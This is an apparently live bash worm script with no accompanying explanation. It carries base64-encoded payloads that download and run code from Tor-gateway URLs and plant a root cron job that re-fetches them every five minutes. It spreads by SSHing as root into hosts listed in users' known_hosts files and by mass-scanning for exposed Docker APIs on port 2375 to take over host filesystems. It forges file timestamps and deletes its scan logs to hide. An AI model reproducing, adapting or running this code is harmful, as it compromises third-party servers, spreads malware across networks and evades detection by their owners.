#!/bin/bash
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
sh="dW5zZXQgSElTVEZJTEU7ZnVuY3Rpb24gZDEoKXsgY3VybCAtLXJldHJ5IDIgLS1jb25uZWN0LXRpbWVvdXQgMjYgLS1tYXgtdGltZSA3NSAtLXVzZXItYWdlbnQgJ01vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzUxLjAuMjcwNC4xMDMgU2FmYXJpLzUzNy4zNicgLWZzU0xrICQxOyB9O2Z1bmN0aW9uIGQyKCl7IHdnZXQgLS10cmllcz0yIC0tY29ubmVjdC10aW1lb3V0PTI2IC0tdGltZW91dD03NSAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIC0tdXNlci1hZ2VudD0nTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTEuMC4yNzA0LjEwMyBTYWZhcmkvNTM3LjM2JyAtcU8tICQxOyB9O3UxPSJodHRwczovL2VrbnI3M3V0cjd1N2J6d28ub25pb24ud3Mvd3AtY29udGVudC9KNk04NlYiO3UyPSJodHRwczovL2VrbnI3M3V0cjd1N2J6d28ub25pb24ubHkvd3AtY29udGVudC9KNk04NlYiO3UzPSJodHRwczovL2VrbnI3M3V0cjd1N2J6d28udG9yMndlYi5zdS93cC1jb250ZW50L0o2TTg2ViI7KGQxICR7dTF9fHxkMSAke3UyfXx8ZDEgJHt1Mn18fGQyICR7dTF9fHxkMiAke3UyfXx8ZDIgJHt1M30pfC9iaW4vYmFzaCAmJwo="
cr="TUFJTFRPPScnClNIRUxMPS9iaW4vYmFzaApQQVRIPS91c3IvbG9jYWwvc2JpbjovdXNyL2xvY2FsL2Jpbjovc2JpbjovYmluOi91c3Ivc2JpbjovdXNyL2JpbgoqLzUgKiAqICogKiByb290IGZ1bmN0aW9uIGQxKCl7IGN1cmwgLS1yZXRyeSAyIC0tY29ubmVjdC10aW1lb3V0IDI2IC0tbWF4LXRpbWUgNzUgLS11c2VyLWFnZW50ICdNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81MS4wLjI3MDQuMTAzIFNhZmFyaS81MzcuMzYnIC1mc1NMayAkMTsgfTtmdW5jdGlvbiBkMigpeyB3Z2V0IC0tdHJpZXM9MiAtLWNvbm5lY3QtdGltZW91dD0yNiAtLXRpbWVvdXQ9NzUgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtLXVzZXItYWdlbnQ9J01vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzUxLjAuMjcwNC4xMDMgU2FmYXJpLzUzNy4zNicgLXFPLSAkMTsgfTt1MT0iaHR0cHM6Ly9la25yNzN1dHI3dTdiendvLm9uaW9uLndzL3dwLWNvbnRlbnQvSjZNODZWIjt1Mj0iaHR0cHM6Ly9la25yNzN1dHI3dTdiendvLm9uaW9uLmx5L3dwLWNvbnRlbnQvSjZNODZWIjt1Mz0iaHR0cHM6Ly9la25yNzN1dHI3dTdiendvLnRvcjJ3ZWIuc3Uvd3AtY29udGVudC9KNk04NlYiOyhkMSAke3UxfXx8ZDEgJHt1Mn18fGQxICR7dTJ9fHxkMiAke3UxfXx8ZDIgJHt1Mn18fGQyICR7dTN9KXwvYmluL2Jhc2ggJgo="

if [ "$(command -v ssh|wc -l)" -eq 1 ]; then
    if [ ! -f /etc/ssh/modulus ]; then
        if [ -d /root/.ssh ]; then
            hb=('/root')
        else
            hb=()
        fi
        for i in $(find /home -mindepth 1 -maxdepth 1 -type d); do
            if [ -d $i/.ssh ]; then
                hb+=("$i")
    	    fi
        done
        for hd in {hb[@]}; do
            if [ -f $hd/.ssh/known_hosts ] && [ "$(find $hd/.ssh -type f -name "id_*" -print|wc -l)" -ne 0 ]; then
                for i in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $hd/.ssh/known_hosts); do
                    ssh -oBatchMode=yes -oStrictHostChecking=no -oConnectTimeOut=8 -t root@$i "unset HISTFILE;echo ${sh}|base64 -d|/bin/bash" &
                done
            fi
        done
        touch -amr /etc/ssh/ssh_config /etc/ssh/modulus
    fi
fi

if [ "$(command -v masscan|wc -l)" -eq 0 ]; then
    if [ -f /usr/bin/apt-get ]; then
	    DEBIAN_FRONTEND=noninteractive
	    apt-get install -y masscan iproute2 >/dev/null 2>&1
    elif [ -f /usr/bin/yum ]; then
	    yum install -y masscan iproute2 >/dev/null 2>&1
    elif [ -f /usr/bin/pacman ]; then
	    pacman -S -y masscan iproute2 >/dev/null 2>&1
    elif [ -f /usr/bin/up2date ]; then
	    up2date install -y masscan iproute2 >/dev/null 2>&1
    fi
fi

if [ "$(command -v masscan|wc -l)" -eq 1 ] && [ "$(command -v ip|wc -l)" -eq 1 ] && [ "$(command -v docker|wc -l)" -eq 1 ]; then
    if [ ! -f /var/log/alternatives.log.1 ]; then
        eval sl="/var/log/$(head /dev/urandom|tr -dc A-Za-z0-9|head -c $(shuf -i 6-11 -n 1))"
        mkdir -p /var/log
        ip -o -f inet a show|awk '/scope global/ {print $4}'|xargs masscan "$@" --ports 2375 --rate=60000 -oG ${sl}
        sed -i -e 's/^Host: \([0-9.]*\).*Ports: \([0-9]*\).*$/\1:\2/g' -e '/Masscan/d' -e '/scanned/d' ${sl}
        while read i; do
            docker -H tcp://$i run --rm -v /:/mnt busybox chroot /mnt sh -c "echo ${cr}|base64 -d|tee /etc/cron.d/crontab"
        done < ${sl}
        rm -f ${sl}
        touch -amr /var/log/boot.log /var/log/alternatives.log.1
    fi

    if [ ! -f /var/log/alternatives.log.2 ]; then
        eval sl="/var/log/$(head /dev/urandom|tr -dc A-Za-z0-9|head -c $(shuf -i 6-11 -n 1))"
        mkdir -p /var/log
        masscan "$(curl -fsSLk --max-time 6 https://ipinfo.io/ip)/24" --ports 2375 --rate=60000 -oG ${sl}
        sed -i -e 's/^Host: \([0-9.]*\).*Ports: \([0-9]*\).*$/\1:\2/g' -e '/Masscan/d' -e '/scanned/d' ${sl}
        while read i; do
            docker -H tcp://$i run --rm -v /:/mnt busybox chroot /mnt sh -c "echo ${cr}|base64 -d|tee /etc/cron.d/crontab"
        done < ${sl}
        rm -f ${sl}
        touch -amr /var/log/boot.log /var/log/alternatives.log.2
    fi
fi
exit 0
